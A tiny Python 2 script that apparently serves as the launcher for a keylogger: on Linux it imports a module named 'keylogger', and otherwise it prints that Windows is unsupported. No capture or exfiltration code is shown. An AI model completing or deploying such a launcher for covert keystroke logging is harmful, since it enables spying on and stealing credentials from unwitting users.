import sys
if 'linux' in sys.platform:
  import keylogger
else:
  print 'windows OS not supported'
